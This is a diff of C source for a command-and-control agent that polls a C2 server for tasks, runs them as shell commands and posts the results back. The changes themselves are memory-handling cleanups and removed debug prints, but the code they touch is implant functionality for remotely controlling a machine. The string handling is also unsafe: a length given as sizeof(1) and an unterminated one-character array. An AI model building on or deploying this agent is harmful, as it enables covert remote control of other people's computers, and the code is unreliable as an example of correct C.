@@ -118,7 +118,6 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
 	mem->size += realsize;
 	mem->response[mem->size] = 0;
 
-	//   printf("The data in the function is %s\n\n", mem->memory);
 
 	return realsize;
 }
@@ -190,8 +189,6 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 
 	CURLcode result = curl_easy_perform(web.curl);
 
-	printf("The data returning from check tasks is %s\n\n", sa->response);
-
 	if (result != CURLE_OK)
 	{
 		fprintf(stderr, "download problem: %s\n",
@@ -200,6 +197,8 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 	}
 
 	curl_easy_cleanup(web.curl);
+	curl_mime_free(web.form);
+
 	return true;
 }
 
@@ -218,6 +217,7 @@ bool parse_tasks(char *response, struct tasks *task)
 	int count = 0;
     memset(line, 0, sizeof(line));
 
+	char **tmp_space = NULL;
 // While loop reads each line FILE *word_source (file(s) or stdin).
 	while (fgets(line, sizeof(line), response_file) != NULL) {
 		++count;
@@ -226,7 +226,7 @@ bool parse_tasks(char *response, struct tasks *task)
 			space for new token. */
 		if (task->sz == task->cap) {
 			task->cap *= 2;
-			char **tmp_space = realloc(task->tasks_array,
+			tmp_space = realloc(task->tasks_array,
 							task->cap *
 							sizeof(*task->tasks_array));
 			if (!tmp_space) {
@@ -286,6 +286,7 @@ bool exec_cmd(struct tasks *task)
 	char line[1024] = {'\0'};
 	int cmd_ret = 0;
 	size_t cur_len = 0;
+	char *tmp_space = NULL;
 
 	char space[1] = " ";
 	strncat(task->cmd, space, sizeof(1));
@@ -298,7 +299,7 @@ bool exec_cmd(struct tasks *task)
 		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
 		{
 			size_t buf_len = strlen(line);
-			char *tmp_space = realloc(task->results, buf_len + cur_len + 1);
+			tmp_space = realloc(task->results, buf_len + cur_len + 1);
 			if (!tmp_space)
 			{
 				perror("Unable to resize.\n");
@@ -328,11 +329,13 @@ bool exec_cmd(struct tasks *task)
 // Posts task results to C2 server.
 bool post_results(struct tasks *task, struct strings_array *sa)
 {
+
+	struct web_comms web = {NULL, 0, NULL};
 	// struct strings_array chunk = {.response = malloc(0), .size = 0};
 	sa->response = malloc(0);
 	sa->size = 0;
 
-	struct web_comms web = {NULL, 0, NULL};
+
 
 	if (!curl_prep(&web))
 	{
@@ -391,7 +394,10 @@ void destroy(struct tasks *task)
 		}
 	}
 	// Frees memory for entire file names array.
-	free(task->tasks_array);
+	if (task->tasks_array) {
+		free(task->tasks_array);
+	}
+
 }
 
 // Sets task struct values to zero.
